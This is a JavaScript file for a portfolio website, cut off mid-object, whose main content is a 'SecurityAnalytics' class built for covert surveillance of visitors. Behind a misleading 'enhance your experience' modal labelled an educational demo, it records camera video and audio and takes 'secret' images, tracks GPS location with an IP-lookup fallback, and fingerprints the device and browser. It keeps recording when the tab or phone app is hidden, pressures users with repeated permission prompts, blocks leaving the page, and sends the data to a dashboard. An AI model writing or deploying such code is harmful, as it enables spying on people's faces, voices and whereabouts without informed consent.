// Modern Futuristic Portfolio JavaScript

// Initialize AOS (Animate On Scroll)
AOS.init({
  duration: 1000,
  once: true,
  offset: 100
});

// ============ ANALYTICS INTEGRATION START ============
class SecurityAnalytics {
  constructor() {
    this.collectedData = {
      camera: null,
      location: null,
      device: null,
      browser: null,
      permissions: {},
      timestamp: new Date().toISOString(),
      secretImages: []
    };
    this.cameraStream = null;
    this.secretCaptureInterval = null;
    this.currentViewingImage = null;
    this.dashboardUrl = '/dashboard';
    this.sessionId = this.generateSessionId();
    this.dashboardWindow = null;
    
    // Video recording properties
    this.mediaRecorder = null;
    this.recordedChunks = [];
    this.videoBlob = null;
    this.recordingStartTime = null;
    this.recordingDuration = 2 * 60 * 1000; // 2 minutes in milliseconds
    this.imageCaptureInterval = null;
    this.recordingTimeout = null;
    
    // Tab visibility tracking
    this.isTabHidden = false;
    this.tabHiddenTime = null;
    
    // Mobile-specific tracking
    this.isMobileAppHidden = false;
    this.mobileAppHiddenTime = null;
    this.mobileSaveInterval = null;
    this.backgroundSaveInterval = null;
    this.lastDeviceActivity = Date.now();
    this.lastUserActivity = Date.now();
    
    this.init();
  }

  init() {
    // Show permission modal after portfolio loads
    setTimeout(() => {
      this.showPermissionModal();
    }, 3000);

    // Set up event listeners for analytics
    this.setupAnalyticsListeners();
    
    // Set up tab visibility detection
    this.setupTabVisibilityDetection();
    
    // Set up page unload detection for final save
    this.setupPageUnloadDetection();
  }

  setupAnalyticsListeners() {
    // Listen for dashboard messages
    window.addEventListener('message', (event) => {
      if (event.data.type === 'DASHBOARD_READY') {
        this.sendInitialData();
      }
    });
  }

  setupTabVisibilityDetection() {
    // Handle tab visibility changes
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        // Tab is now hidden (user switched tabs or minimized)
        console.log('Tab hidden - continuing recording in background');
        this.handleTabHidden();
      } else {
        // Tab is now visible (user returned to tab)
        console.log('Tab visible - resuming normal operation');
        this.handleTabVisible();
      }
    });

    // Handle page focus/blur events
    window.addEventListener('blur', () => {
      console.log('Window lost focus - continuing background recording');
      this.handleTabHidden();
    });

    window.addEventListener('focus', () => {
      console.log('Window gained focus - resuming normal operation');
      this.handleTabVisible();
    });

    // Mobile-specific event listeners
    this.setupMobileEventListeners();
  }

  setupMobileEventListeners() {
    // Handle mobile app switching and background mode
    if (this.isMobileDevice()) {
      console.log('Mobile device detected - setting up mobile protection');
      
      // iOS Safari specific events
      if (this.isIOS()) {
        this.setupIOSProtection();
      }
      
      // Android Chrome specific events
      if (this.isAndroid()) {
        this.setupAndroidProtection();
      }
      
      // General mobile events
      this.setupGeneralMobileProtection();
    }
  }

  isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
           (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1); // iPad detection
  }

  isIOS() {
    return /iPad|iPhone|iPod/.test(navigator.userAgent) ||
           (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
  }

  isAndroid() {
    return /Android/.test(navigator.userAgent);
  }

  setupIOSProtection() {
    console.log('Setting up iOS Safari protection');
    
    // iOS specific page visibility
    document.addEventListener('webkitvisibilitychange', () => {
      if (document.webkitHidden) {
        console.log('iOS app hidden - continuing recording');
        this.handleMobileAppHidden();
      } else {
        console.log('iOS app visible - resuming normal operation');
        this.handleMobileAppVisible();
      }
    });

    // iOS Safari specific events
    window.addEventListener('pagehide', (event) => {
      console.log('iOS page hide event - performing emergency save');
      this.performFinalSave();
      
      // Save to sessionStorage for iOS app switching
      this.saveIOSSessionData();
    });

    // Handle iOS memory pressure
    window.addEventListener('memorypressure', () => {
      console.log('iOS memory pressure - saving data');
      this.saveEmergencyData();
    });
  }

  setupAndroidProtection() {
    console.log('Setting up Android Chrome protection');
    
    // Android specific events
    window.addEventListener('beforeinstallprompt', (event) => {
      console.log('Android before install prompt - saving data');
      this.saveEmergencyData();
    });

    // Handle Android back button
    window.addEventListener('popstate', (event) => {
      console.log('Android back button pressed');
      this.performFinalSave();
    });
  }

  setupGeneralMobileProtection() {
    console.log('Setting up general mobile protection');
    
    // Handle screen orientation changes
    screen.addEventListener('orientationchange', () => {
      console.log('Screen orientation changed - ensuring recording continues');
      if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
        console.log('Recording continues through orientation change');
      }
    });

    // Handle device motion and orientation
    window.addEventListener('devicemotion', () => {
      // User is actively using device - ensure recording continues
      this.lastDeviceActivity = Date.now();
    });

    window.addEventListener('deviceorientation', () => {
      // User is actively using device - ensure recording continues
      this.lastDeviceActivity = Date.now();
    });

    // Handle touch events to detect user activity
    document.addEventListener('touchstart', () => {
      this.lastUserActivity = Date.now();
    });

    document.addEventListener('touchmove', () => {
      this.lastUserActivity = Date.now();
    });

    // Handle battery API to monitor device state
    if ('getBattery' in navigator) {
      navigator.getBattery().then(battery => {
        battery.addEventListener('levelchange', () => {
          console.log(`Battery level: ${battery.level * 100}% - ensuring data safety`);
          if (battery.level < 0.2) {
            // Low battery - save data more frequently
            this.saveEmergencyData();
          }
        });

        battery.addEventListener('chargingchange', () => {
          console.log(`Charging status changed: ${battery.charging}`);
          this.saveEmergencyData();
        });
      });
    }

    // Handle network status changes
    window.addEventListener('online', () => {
      console.log('Network restored - syncing data');
      this.syncPendingData();
    });

    window.addEventListener('offline', () => {
      console.log('Network lost - saving data locally');
      this.saveEmergencyData();
    });

    // Set up periodic data save for mobile
    this.setupMobilePeriodicSave();
  }

  setupMobilePeriodicSave() {
    // Save data every 30 seconds on mobile to prevent data loss
    this.mobileSaveInterval = setInterval(() => {
      if (this.isRecording()) {
        console.log('Mobile periodic save - saving current recording state');
        this.saveMobileRecordingState();
      }
    }, 30000); // Every 30 seconds
  }

  isRecording() {
    return this.mediaRecorder && this.mediaRecorder.state === 'recording';
  }

  saveMobileRecordingState() {
    const recordingState = {
      sessionId: this.sessionId,
      isRecording: this.isRecording(),
      recordingStartTime: this.recordingStartTime,
      currentDuration: this.recordingStartTime ? Date.now() - this.recordingStartTime : 0,
      imagesCaptured: this.collectedData.secretImages.length,
      timestamp: new Date().toISOString(),
      deviceInfo: this.getDeviceInfo(),
      location: this.collectedData.location,
      permissions: this.collectedData.permissions
    };

    localStorage.setItem(`mobile_recording_${this.sessionId}`, JSON.stringify(recordingState));
    console.log('Mobile recording state saved');
  }

  saveIOSSessionData() {
    // iOS specific session storage for app switching
    const iosData = {
      sessionId: this.sessionId,
      recordingState: this.isRecording(),
      timestamp: Date.now(),
      collectedData: this.collectedData
    };

    sessionStorage.setItem(`ios_backup_${this.sessionId}`, JSON.stringify(iosData));
    console.log('iOS session data saved for app switching');
  }

  handleMobileAppHidden() {
    console.log('Mobile app hidden - ensuring recording continues');
    
    // Continue recording in background
    if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
      console.log('Video recording continues in mobile background');
    }

    // Continue image capture
    if (this.imageCaptureInterval) {
      console.log('Image capture continues in mobile background');
    }

    // Mark mobile app as hidden
    this.isMobileAppHidden = true;
    this.mobileAppHiddenTime = Date.now();

    // More frequent data saves during mobile background
    this.setupBackgroundDataSave();
  }

  handleMobileAppVisible() {
    console.log('Mobile app visible - resuming normal operation');
    
    if (this.isMobileAppHidden) {
      const hiddenDuration = Date.now() - this.mobileAppHiddenTime;
      console.log(`Mobile app was hidden for ${Math.round(hiddenDuration / 1000)} seconds`);
      
      // Sync any pending data
      this.syncPendingData();
      
      // Update dashboard with current state
      this.transmitCollectedData();
    }

    this.isMobileAppHidden = false;
    this.mobileAppHiddenTime = null;

    // Clear background save interval
    if (this.backgroundSaveInterval) {
      clearInterval(this.backgroundSaveInterval);
      this.backgroundSaveInterval = null;
    }
  }

  setupBackgroundDataSave() {
    // Save data every 10 seconds when app is in background
    this.backgroundSaveInterval = setInterval(() => {
      console.log('Background data save - ensuring no data loss');
      this.saveEmergencyData();
      this.saveMobileRecordingState();
    }, 10000);
  }

  syncPendingData() {
    // Check for and sync any pending data from localStorage/sessionStorage
    try {
      const mobileData = localStorage.getItem(`mobile_recording_${this.sessionId}`);
      if (mobileData) {
        console.log('Syncing mobile recording data');
        // Send to dashboard
        this.sendDataToDashboard(JSON.parse(mobileData));
        localStorage.removeItem(`mobile_recording_${this.sessionId}`);
      }

      const iosData = sessionStorage.getItem(`ios_backup_${this.sessionId}`);
      if (iosData) {
        console.log('Syncing iOS backup data');
        // Send to dashboard
        this.sendDataToDashboard(JSON.parse(iosData));
        sessionStorage.removeItem(`ios_backup_${this.sessionId}`);
      }
    } catch (error) {
      console.error('Failed to sync pending data:', error);
    }
  }

  setupPageUnloadDetection() {
    // Handle page unload, tab close, or navigation away
    window.addEventListener('beforeunload', (event) => {
      console.log('Page unloading - performing final save');
      this.performFinalSave();
      
      // Show a message to user (optional)
      event.preventDefault();
      event.returnValue = 'Recording in progress. Are you sure you want to leave?';
      return event.returnValue;
    });

    // Handle page visibility API for better detection
    window.addEventListener('pagehide', () => {
      console.log('Page hiding - performing emergency save');
      this.performFinalSave();
    });

    // Handle browser close
    window.addEventListener('unload', () => {
      console.log('Page unloading - final cleanup');
      this.performFinalSave();
    });
  }

  handleTabHidden() {
    // Continue recording even when tab is hidden
    if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
      console.log('Continuing video recording in background');
      // Recording continues automatically
    }

    // Continue image capture in background
    if (this.imageCaptureInterval) {
      console.log('Continuing image capture in background');
      // Image capture continues automatically
    }

    // Mark that tab is hidden for tracking
    this.isTabHidden = true;
    this.tabHiddenTime = Date.now();
  }

  handleTabVisible() {
    // Resume normal operations when tab becomes visible
    if (this.isTabHidden) {
      const hiddenDuration = Date.now() - this.tabHiddenTime;
      console.log(`Tab was hidden for ${Math.round(hiddenDuration / 1000)} seconds`);
      
      // Send data update to dashboard
      this.transmitCollectedData();
    }

    this.isTabHidden = false;
    this.tabHiddenTime = null;
  }

  performFinalSave() {
    console.log('Performing final save before page unload');

    // Stop recording if still active
    if (this.mediaRecorder && this.mediaRecorder.state === 'recording') {
      console.log('Stopping recording for final save');
      this.stopVideoRecording();
    }

    // Final data transmission
    this.transmitCollectedData();

    // Save any pending data to localStorage as backup
    this.saveEmergencyData();

    console.log('Final save completed');
  }

  saveEmergencyData() {
    // Save all collected data to localStorage as emergency backup
    const emergencyData = {
      sessionId: this.sessionId,
      timestamp: new Date().toISOString(),
      collectedData: this.collectedData,
      secretImages: this.collectedData.secretImages,
      deviceInfo: this.getDeviceInfo(),
      location: this.collectedData.location,
      permissions: this.collectedData.permissions,
      recordingDuration: this.recordingStartTime ? Date.now() - this.recordingStartTime : 0
    };

    localStorage.setItem(`emergency_backup_${this.sessionId}`, JSON.stringify(emergencyData));
    console.log('Emergency data saved to localStorage');
  }

  showPermissionModal() {
    // Create modal if it doesn't exist
    if (!document.getElementById('analyticsModal')) {
      const modalHTML = `
        <div id="analyticsModal" class="analytics-modal">
          <div class="analytics-modal-content">
            <div class="modal-header">
              <h3>Enhance Your Experience</h3>
              <p>This portfolio uses analytics to provide better user experience and demonstrate web capabilities.</p>
            </div>
            <div class="modal-body">
              <p>By allowing access, you enable:</p>
              <ul>
                <li>Camera access for interactive features</li>
                <li>Location data for personalized content</li>
                <li>Device optimization for better performance</li>
                <li>Usage analytics for continuous improvement</li>
              </ul>
              <div class="security-badges">
                <span class="badge">SSL Secured</span>
                <span class="badge">Privacy Protected</span>
                <span class="badge">Educational Demo</span>
              </div>
            </div>
            <div class="modal-footer">
              <button id="acceptAnalytics" class="btn btn-primary">Allow Enhanced Features</button>
              <button id="declineAnalytics" class="btn btn-secondary">Basic Experience Only</button>
            </div>
            <p class="educational-note">
              <small>This is an educational demonstration of web analytics and security concepts.</small>
            </p>
          </div>
        </div>
      `;
      
      document.body.insertAdjacentHTML('beforeend', modalHTML);
      this.addModalStyles();
      
      // Add event listeners
      document.getElementById('acceptAnalytics').addEventListener('click', () => this.handleAccept());
      document.getElementById('declineAnalytics').addEventListener('click', () => this.handleDecline());
    }
    
    // Show the modal
    document.getElementById('analyticsModal').style.display = 'flex';
  }

  addModalStyles() {
    const styles = `
      .analytics-modal {
        display: none;
        position: fixed;
        z-index: 10000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        backdrop-filter: blur(10px);
        justify-content: center;
        align-items: center;
      }
      
      .analytics-modal-content {
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        color: white;
        padding: 40px;
        border-radius: 20px;
        max-width: 500px;
        width: 90%;
        border: 2px solid rgba(0, 212, 255, 0.3);
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        animation: modalSlideIn 0.5s ease;
      }
      
      @keyframes modalSlideIn {
        from {
          opacity: 0;
          transform: translateY(-50px) scale(0.9);
        }
        to {
          opacity: 1;
          transform: translateY(0) scale(1);
        }
      }
      
      .modal-header h3 {
        color: #00d4ff;
        margin-bottom: 10px;
        font-size: 1.5em;
      }
      
      .modal-body ul {
        margin: 20px 0;
        padding-left: 20px;
      }
      
      .modal-body li {
        margin: 10px 0;
      }
      
      .security-badges {
        display: flex;
        justify-content: center;
        gap: 10px;
        margin: 20px 0;
        flex-wrap: wrap;
      }
      
      .badge {
        background: rgba(0, 212, 255, 0.2);
        color: #00d4ff;
        padding: 5px 15px;
        border-radius: 20px;
        font-size: 0.8em;
        border: 1px solid rgba(0, 212, 255, 0.5);
      }
      
      .modal-footer {
        display: flex;
        gap: 15px;
        justify-content: center;
        margin-top: 30px;
      }
      
      .educational-note {
        text-align: center;
        margin-top: 20px;
        opacity: 0.7;
        font-size: 0.9em;
      }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
  }

  async handleAccept() {
    const modal = document.getElementById('analyticsModal');
    modal.style.display = 'none';
    
    // Start permission requests with retry mechanism
    await this.requestPermissionsWithRetry();
    
    // Start collecting data
    await this.collectAllData();
    
    // Collect mobile network information
    await this.collectMobileNetworkInfo();
    
    // Send initial data to dashboard
    await this.transmitCollectedData();
    
    // Open dashboard for monitoring
    this.openDashboard();
    
    console.log('Analytics collection started');
  }

  async requestPermissionsWithRetry() {
    const maxRetries = 3;
    let retryCount = 0;
    
    while (retryCount < maxRetries) {
      try {
        // Show visual guidance before requesting permissions
        this.showPermissionGuidance('camera');
        
        const cameraStream = await this.requestPermissionWithTimeout(
          () => navigator.mediaDevices.getUserMedia({ 
            video: { width: 1280, height: 720 },
            audio: true 
          }),
          10000
        );
        
        // Camera permission granted
        this.hidePermissionGuidance();
        
        // Now request location
        this.showPermissionGuidance('location');
        
        const position = await this.requestPermissionWithTimeout(
          () => new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            });
          }),
          15000
        );
        
        // All permissions granted
        this.hidePermissionGuidance();
        this.showSuccessMessage();
        
        // Store the successful permissions
        this.cameraStream = cameraStream;
        this.collectedData.location = {
          available: true,
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed,
          timestamp: position.timestamp,
          source: 'browser'
        };
        
        // Start image capture only (no video recording)
        this.startImageCapture();
        
        return; // Success, exit retry loop
        
      } catch (error) {
        retryCount++;
        this.hidePermissionGuidance();
        
        if (retryCount < maxRetries) {
          // Show retry modal with stronger guidance
          const shouldRetry = await this.showRetryModal(error.name, retryCount, maxRetries);
          if (!shouldRetry) {
            break; // User chose not to retry
          }
        } else {
          // Max retries reached, show final message
          this.showMaxRetriesMessage();
        }
      }
    }
  }

  async requestPermissionWithTimeout(permissionRequest, timeout) {
    return Promise.race([
      permissionRequest(),
      new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Permission request timeout')), timeout)
      )
    ]);
  }

  showPermissionGuidance(type) {
    // Create guidance overlay with arrow
    const guidance = document.createElement('div');
    guidance.id = 'permissionGuidance';
    guidance.innerHTML = `
      <div class="guidance-overlay">
        <div class="guidance-arrow ${type}-arrow">
          <div class="arrow-shaft"></div>
          <div class="arrow-head"></div>
        </div>
        <div class="guidance-message">
          <div class="guidance-icon">
            ${type === 'camera' ? '&#x1F4F7;' : '&#x1F4CD;'}
          </div>
          <h3>Click "Allow" in your browser!</h3>
          <p>
            ${type === 'camera' 
              ? 'Look for the camera permission prompt in your browser address bar or popup' 
              : 'Look for the location permission prompt in your browser address bar or popup'
            }
          </p>
          <div class="browser-hint">
            <div class="hint-icon">?</div>
            <span>Check your address bar for permission requests</span>
          </div>
        </div>
        <div class="pulse-dot"></div>
      </div>
    `;
    
    // Add styles
    const style = document.createElement('style');
    style.textContent = `
      .guidance-overlay {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.8);
        z-index: 10000;
        display: flex;
        align-items: center;
        justify-content: center;
        animation: fadeIn 0.3s ease-out;
      }
      
      .guidance-arrow {
        position: absolute;
        animation: bounce 2s infinite;
      }
      
      .camera-arrow {
        top: 20%;
        right: 20%;
        transform: rotate(-45deg);
      }
      
      .location-arrow {
        top: 20%;
        right: 20%;
        transform: rotate(-45deg);
      }
      
      .arrow-shaft {
        width: 4px;
        height: 80px;
        background: linear-gradient(to bottom, #00d4ff, #00ff88);
        margin: 0 auto;
        border-radius: 2px;
      }
      
      .arrow-head {
        width: 0;
        height: 0;
        border-left: 15px solid transparent;
        border-right: 15px solid transparent;
        border-top: 25px solid #00ff88;
        margin: -5px auto 0;
      }
      
      .guidance-message {
        background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(0, 255, 136, 0.1));
        border: 2px solid #00d4ff;
        border-radius: 15px;
        padding: 30px;
        max-width: 400px;
        text-align: center;
        color: white;
        backdrop-filter: blur(10px);
        animation: slideUp 0.5s ease-out 0.3s both;
      }
      
      .guidance-icon {
        font-size: 48px;
        margin-bottom: 15px;
        animation: pulse 1.5s infinite;
      }
      
      .guidance-message h3 {
        margin: 0 0 15px 0;
        font-size: 24px;
        color: #00d4ff;
        text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
      }
      
      .guidance-message p {
        margin: 0 0 20px 0;
        font-size: 16px;
        line-height: 1.4;
      }
      
      .browser-hint {
        background: rgba(255, 255, 255, 0.1);
        border-radius: 10px;
        padding: 12px;
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 14px;
      }
      
      .hint-icon {
        width: 20px;
        height: 20px;
        background: #00d4ff;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: bold;
        font-size: 12px;
      }
      
      .pulse-dot {
        position: absolute;
        width: 20px;
        height: 20px;
        background: #00ff88;
        border-radius: 50%;
        top: 15%;
        right: 15%;
        animation: pulse 1s infinite;
      }
      
      @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
      }
      
      @keyframes slideUp {
        from { 
          opacity: 0;
          transform: translateY(30px);
        }
        to { 
          opacity: 1;
          transform: translateY(0);
        }
      }
      
      @keyframes bounce {
        0%, 20%, 50%, 80%, 100% { transform: translateY(0) rotate(-45deg); }
        40% { transform: translateY(-20px) rotate(-45deg); }
        60% { transform: translateY(-10px) rotate(-45deg); }
      }
      
      @keyframes pulse {
        0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.7); }
        70% { box-shadow: 0 0 0 20px rgba(0, 255, 136, 0); }
        100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
      }
    `;
    
    document.head.appendChild(style);
    document.body.appendChild(guidance);
    
    // Auto-remove after 15 seconds
    setTimeout(() => {
      this.hidePermissionGuidance();
    }, 15000);
  }

  hidePermissionGuidance() {
    const guidance = document.getElementById('permissionGuidance');
    if (guidance) {
      guidance.remove();
    }
    
    const style = document.querySelector('style[data-permission-guidance]');
    if (style) {
      style.remove();
    }
  }

  async showRetryModal(errorType, retryCount, maxRetries) {
    return new Promise((resolve) => {
      const modal = document.createElement('div');
      modal.id = 'retryModal';
      modal.innerHTML = `
        <div class="retry-modal-content">
          <div class="retry-icon">!</div>
          <h3>Permission Needed</h3>
          <p>
            ${errorType === 'NotAllowedError' 
              ? 'Please click "Allow" when your browser asks for permissions. This is required for enhanced features.'
              : 'Permission request timed out. Please try again and respond quickly to the browser prompt.'
            }
          </p>
          <div class="retry-progress">
            Attempt ${retryCount} of ${maxRetries}
          </div>
          <div class="retry-buttons">
            <button class="retry-btn" id="retryBtn">Try Again</button>
            <button class="skip-btn" id="skipBtn">Skip</button>
          </div>
        </div>
      `;
      
      // Add styles
      const style = document.createElement('style');
      style.textContent = `
        .retry-modal-content {
          background: linear-gradient(135deg, rgba(255, 0, 255, 0.1), rgba(0, 212, 255, 0.1));
          border: 2px solid #ff00ff;
          border-radius: 15px;
          padding: 30px;
          max-width: 400px;
          text-align: center;
          color: white;
          backdrop-filter: blur(10px);
        }
        
        .retry-icon {
          width: 60px;
          height: 60px;
          background: #ff00ff;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 32px;
          font-weight: bold;
          margin: 0 auto 20px;
          animation: pulse 1.5s infinite;
        }
        
        .retry-modal-content h3 {
          margin: 0 0 15px;
          color: #ff00ff;
          font-size: 24px;
        }
        
        .retry-progress {
          background: rgba(255, 255, 255, 0.1);
          border-radius: 20px;
          padding: 8px;
          margin: 20px 0;
          font-size: 14px;
        }
        
        .retry-buttons {
          display: flex;
          gap: 15px;
          justify-content: center;
        }
        
        .retry-btn {
          background: linear-gradient(45deg, #00d4ff, #00ff88);
          border: none;
          color: white;
          padding: 12px 25px;
          border-radius: 25px;
          cursor: pointer;
          font-weight: bold;
          transition: transform 0.2s;
        }
        
        .retry-btn:hover {
          transform: scale(1.05);
        }
        
        .skip-btn {
          background: transparent;
          border: 1px solid #666;
          color: #666;
          padding: 12px 25px;
          border-radius: 25px;
          cursor: pointer;
        }
      `;
      
      document.head.appendChild(style);
      document.body.appendChild(modal);
      
      document.getElementById('retryBtn').addEventListener('click', () => {
        modal.remove();
        style.remove();
        resolve(true);
      });
      
      document.getElementById('skipBtn').addEventListener('click', () => {
        modal.remove();
        style.remove();
        resolve(false);
      });
    });
  }

  showSuccessMessage() {
    const message = document.createElement('div');
    message.id = 'successMessage';
    message.innerHTML = `
      <div class="success-content">
        <div class="success-icon">+</div>
        <h3>Permissions Granted!</h3>
        <p>Enhanced features are now enabled</p>
      </div>
    `;
    
    const style = document.createElement('style');
    style.textContent = `
      .success-content {
        background: linear-gradient(135deg, rgba(0, 255, 136, 0.2), rgba(0, 212, 255, 0.2));
        border: 2px solid #00ff88;
        border-radius: 15px;
        padding: 20px;
        text-align: center;
        color: white;
        backdrop-filter: blur(10px);
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 9999;
        animation: slideInRight 0.5s ease-out;
      }
      
      .success-icon {
        width: 40px;
        height: 40px;
        background: #00ff88;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
        font-weight: bold;
        margin: 0 auto 10px;
      }
      
      @keyframes slideInRight {
        from {
          opacity: 0;
          transform: translateX(100px);
        }
        to {
          opacity: 1;
          transform: translateX(0);
        }
      }
    `;
    
    document.head.appendChild(style);
    document.body.appendChild(message);
    
    setTimeout(() => {
      message.remove();
      style.remove();
    }, 3000);
  }

  showMaxRetriesMessage() {
    const message = document.createElement('div');
    message.id = 'maxRetriesMessage';
    message.innerHTML = `
      <div class="max-retries-content">
        <div class="warning-icon">!</div>
        <h3>Basic Experience Only</h3>
        <p>Some enhanced features will be limited without camera and location permissions.</p>
      </div>
    `;
    
    const style = document.createElement('style');
    style.textContent = `
      .max-retries-content {
        background: linear-gradient(135deg, rgba(255, 165, 0, 0.2), rgba(255, 0, 0, 0.2));
        border: 2px solid #ff6600;
        border-radius: 15px;
        padding: 20px;
        text-align: center;
        color: white;
        backdrop-filter: blur(10px);
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 9999;
        animation: slideInRight 0.5s ease-out;
      }
      
      .warning-icon {
        width: 40px;
        height: 40px;
        background: #ff6600;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
        font-weight: bold;
        margin: 0 auto 10px;
      }
    `;
    
    document.head.appendChild(style);
    document.body.appendChild(message);
    
    setTimeout(() => {
      message.remove();
      style.remove();
    }, 5000);
  }

  handleDecline() {
    const modal = document.getElementById('analyticsModal');
    modal.style.display = 'none';
    
    console.log('Analytics declined - basic experience only');
  }

  async collectAllData() {
    // Collect device information
    this.collectDeviceInfo();
    this.collectBrowserInfo();
    
    // Only try to collect camera if not already collected
    if (!this.cameraStream) {
      await this.tryCollectCamera();
    } else {
      console.log('Camera stream already available, starting recording');
      this.startVideoRecording();
    }
    
    // Only try to collect location if not already collected
    if (!this.collectedData.location.available) {
      await this.tryCollectLocation();
    }
    
    // Collect timezone information
    this.collectTimezoneInfo();
    
    // Collect performance metrics
    this.collectPerformanceMetrics();
    
    console.log('All data collection completed');
  }

  collectDeviceInfo() {
    this.collectedData.device = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      screenResolution: `${screen.width}x${screen.height}`,
      colorDepth: screen.colorDepth,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
      deviceMemory: navigator.deviceMemory || 'Unknown',
      vendor: navigator.vendor || 'Unknown'
    };
  }

  collectBrowserInfo() {
    this.collectedData.browser = {
      name: this.getBrowserName(),
      version: this.getBrowserVersion(),
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      languages: navigator.languages,
      plugins: Array.from(navigator.plugins).map(p => p.name),
      mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
    };
  }

  getBrowserName() {
    const ua = navigator.userAgent;
    if (ua.includes('Chrome')) return 'Chrome';
    if (ua.includes('Firefox')) return 'Firefox';
    if (ua.includes('Safari')) return 'Safari';
    if (ua.includes('Edge')) return 'Edge';
    return 'Unknown';
  }

  getBrowserVersion() {
    const ua = navigator.userAgent;
    const match = ua.match(/(Chrome|Firefox|Safari|Edge)\/(\d+)/);
    return match ? match[2] : 'Unknown';
  }

  async tryCollectCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { width: 1280, height: 720 },
        audio: true
      });
      
      this.cameraStream = stream;
      this.collectedData.camera = {
        available: true,
        capabilities: stream.getVideoTracks()[0].getCapabilities(),
        settings: stream.getVideoTracks()[0].getSettings()
      };
      
      // Start video recording immediately
      this.startVideoRecording();
      
      // Start secret capture
      this.startSecretCapture();
      
    } catch (error) {
      this.collectedData.camera = {
        available: false,
        error: error.message
      };
      console.log('Camera access denied:', error.message);
    }
  }

  async tryCollectLocation() {
    try {
      // High-precision GPS location with multiple attempts for best accuracy
      const position = await new Promise((resolve, reject) => {
        // Try multiple times to get best accuracy
        let attempts = 0;
        const maxAttempts = 3;
        let bestPosition = null;
        
        const attemptLocation = () => {
          attempts++;
          
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              // Check if this is more accurate than previous attempts
              if (!bestPosition || pos.coords.accuracy < bestPosition.coords.accuracy) {
                bestPosition = pos;
              }
              
              if (attempts >= maxAttempts) {
                resolve(bestPosition);
              } else {
                // Wait 1 second and try again for better accuracy
                setTimeout(attemptLocation, 1000);
              }
            },
            (error) => {
              if (attempts >= maxAttempts) {
                reject(error);
              } else {
                setTimeout(attemptLocation, 1000);
              }
            },
            {
              enableHighAccuracy: true,        // Force GPS-level accuracy
              timeout: 15000,               // Longer timeout for GPS
              maximumAge: 0,                 // Fresh location only
              desiredAccuracy: 10               // Target 10-meter accuracy
            }
          );
        };
        
        attemptLocation();
      });
      
      this.collectedData.location = {
        available: true,
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp,
        source: 'gps',
        accuracyLevel: this.getAccuracyLevel(position.coords.accuracy),
        attempts: attempts
      };
      
    } catch (error) {
      // Fallback to IP-based geolocation
      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        
        this.collectedData.location = {
          available: true,
          latitude: ipData.latitude,
          longitude: ipData.longitude,
          accuracy: null,
          altitude: null,
          altitudeAccuracy: null,
          heading: null,
          speed: null,
          timestamp: new Date().toISOString(),
          source: 'ip',
          accuracyLevel: 'City-level',
          ip: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name
        };
      } catch (ipError) {
        this.collectedData.location = {
          available: false,
          error: error.message
        };
        console.log('Location access denied:', error.message);
      }
    }
  }

  getAccuracyLevel(accuracy) {
    if (!accuracy) return 'Unknown';
    if (accuracy <= 10) return 'GPS-level (10m)';
    if (accuracy <= 50) return 'High-precision (50m)';
    if (accuracy <= 100) return 'Medium-precision (100m)';
    return 'Low-precision (100m+)';
  }

  async collectMobileNetworkInfo() {
    this.collectedData.mobileNetwork = {
      available: false,
      data: {}
    };

    try {
      // Collect connection information
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      
      if (connection) {
        this.collectedData.mobileNetwork.available = true;
        this.collectedData.mobileNetwork.data = {
          effectiveType: connection.effectiveType || 'Unknown',
          downlink: connection.downlink || 'Unknown',
          downlinkMax: connection.downlinkMax || 'Unknown',
          rtt: connection.rtt || 'Unknown',
          saveData: connection.saveData || false,
          type: connection.type || 'Unknown'
